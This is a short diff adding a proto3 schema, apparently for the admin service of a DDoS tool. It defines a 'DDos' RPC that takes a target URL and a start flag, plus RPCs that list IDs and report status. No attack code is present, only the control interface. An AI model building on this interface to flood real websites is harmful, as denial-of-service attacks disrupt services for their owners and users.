@@ -1,0 +1,24 @@
+syntax = "proto3";
+
+option go_package = "github.com/murtaza-u/ddos/proto/gen/go/admin";
+
+message Void {}
+
+message Byts {
+  bytes b = 1;
+}
+
+message Ids {
+  repeated string ids = 1;
+}
+
+message Params {
+  string url = 1;
+  bool start = 2;
+}
+
+service AdminSvc {
+  rpc GetIds(Void) returns (Ids);
+  rpc Status(Void) returns (Byts);
+  rpc DDos(Params) returns (Void);
+}
